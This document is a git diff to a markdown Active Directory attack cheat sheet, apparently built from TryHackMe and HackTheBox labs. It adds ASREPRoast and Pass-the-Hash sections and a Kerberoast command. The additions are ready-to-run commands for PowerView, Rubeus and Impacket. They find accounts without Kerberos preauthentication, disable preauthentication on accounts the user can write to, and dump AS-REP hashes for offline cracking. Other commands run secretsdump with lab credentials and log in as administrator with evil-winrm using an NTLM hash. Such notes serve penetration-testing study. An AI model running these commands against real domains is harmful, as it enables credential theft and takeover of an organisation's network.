@@ -20,6 +20,8 @@ Active Directory follows a clear hierarchy, from top to bottom. In that hierarch
       - [Password Spray Attack (Low and Slow Password Guessing)](#password-spray-attack-low-and-slow-password-guessing)
       - [Golden Ticket Attack](#golden-ticket-attack)
       - [DCsync Attack](#dcsync-attack)
+      - [ASREPRoast](#asreproast)
+      - [Pass The Hash](#pass-the-hash)
 
 ### Enumeration
 
@@ -296,6 +298,8 @@ xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-i
   - Impacket:
   ```
   python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
+  
+  sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.83.153 -request
   ```
   - Rubeus:
   ```
@@ -325,6 +329,7 @@ xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-i
   - [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
   - [Spray](https://github.com/Greenwolf/Spray)
   - [Spray-Passwords](https://github.com/ZilentJack/Spray-Passwords)
+  - [Rubeus](https://github.com/GhostPack/Rubeus)
 
 #### Golden Ticket Attack
   ```
@@ -357,13 +362,77 @@ xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-i
   /ptt -> inject ticket on current running session \
   /ticket -> save the ticket on the system for later use
   
-  
+#### ASREPRoast
+ *WUT IS DIS?:* \
+  If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted  
+  blob and bruteforce it offline. 
+ 
+  - PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
+  - AD Module: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`
 
-Cached Credential Storage and Retrieval
-Service Account Attacks (Kerberoast)
-Low and Slow Password Guessing (Password Spray Attack)
-Pass the Hash
-Overpass the Hash
-Pass the Ticket (Silver Ticket)
-Distributed Component Object Model
+
+  Forcefully Disable Kerberos Preauth on an account i have Write Permissions or more!
+  Check for interesting permissions on accounts:
+  
+  
+  **Hint:** We add a filter e.g. RDPUsers to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!
+  
+  PowerView:
+  ```
+  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
+  Disable Kerberos Preauth:
+  Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
+  Check if the value changed:
+  Get-DomainUser -PreauthNotRequired -Verbose
+  ```
+
+  And finally execute the attack using the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) tool.
+  ```
+  #Get a spesific Accounts hash:
+  Get-ASREPHash -UserName <UserName> -Verbose
+
+  #Get any ASREPRoastable Users hashes:
+  Invoke-ASREPRoast -Verbose
+  ```
+
+  Using Rubeus:
+  ```
+  #Trying the attack for all domain users
+  Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
+  
+  #ASREPRoast spesific user
+  Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
+  
+  #ASREPRoast users of a spesific OU (Organization Unit)
+  Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
+  ```
+
+  Using Impacket:
+  ```
+  #Trying the attack for the specified users on the file
+  python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
+
+  sudo python3 GetNPUsers.py controller.local/ -usersfile /tmp/user.txt
+  ```
+#### Pass The Hash
+```
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py THM-AD/backup:backup2517860@10.10.211.190 -dc-ip 10.10.211.190
+
+evil-winrm -i 10.10.211.190 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
+
+```
+-----------------------------------------------------------
+Cached Credential Storage and Retrieval\
+Service Account Attacks (Kerberoast)\
+Low and Slow Password Guessing (Password Spray Attack)\
+Pass the Hash\
+Overpass the Hash\
+Pass the Ticket (Silver Ticket)\
+Distributed Component Object Model\
 Golden Tickets
+
+```
+If you find this error from Linux: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) it because of your local time, you need to synchronise the host with the DC: ntpdate <IP of DC>
+
+sudo ntpdate apt.htb.local
+```
